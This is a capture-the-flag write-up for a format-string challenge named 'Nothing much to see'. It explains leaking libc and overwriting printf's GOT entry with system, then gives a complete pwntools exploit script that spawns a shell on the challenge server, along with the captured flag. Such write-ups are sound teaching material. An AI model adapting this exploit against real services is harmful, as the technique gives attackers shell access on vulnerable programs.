# Nothing much to see

The binary forms an interactive 100-byte printf prompt, where every input has printf called on it directly. No protections, so we can execute a simple GOT overwrite attack. Firstly, we'll need to leak libc - this can be done by leaking \_\_libc\_start\_main\_ret at offset 39. Then, we can use a format string payload to overwrite printf@got with system. Afterwards, everything we enter into the prompt will be system'd, forming a sort of shell. We can type /bin/sh and hit enter to get into a proper shell with this, or just enjoy the existing one. we cat flag.txt to get the flag.

### Flag: TWCTF{kotoshi\_mo\_hazimarimasita\_TWCTF\_de\_gozaimasu}

```text
from pwn import *
context.arch = 'amd64'
e = ELF("./nothing")
p = e.process() if args.LOCAL else remote('pwn02.chal.ctf.westerns.tokyo', 18247)
libc = e.libc if args.LOCAL else ELF("/home/kali/Tools/libc-database/libs/libc6_2.27-3ubuntu1.2_amd64/libc.so.6")
libret = 0x21b97 if not args.LOCAL else 0x26e0b
p.recvuntil(b"> ")
offset = 6
p.sendline("%39$p")
leak = int(p.recvline(),16)
log.info(f"Libc leak: {hex(leak)}")
libcbase = leak - libret
log.info(f"Libc base: {hex(libcbase)}")
libc.address = libcbase
writes = {e.got['printf']:libc.symbols['system']}
payload = fmtstr.fmtstr_payload(offset, writes)
print(len(payload))
p.sendlineafter(b"> ",payload)
p.clean()
p.sendline("/bin/sh")
p.interactive()
```

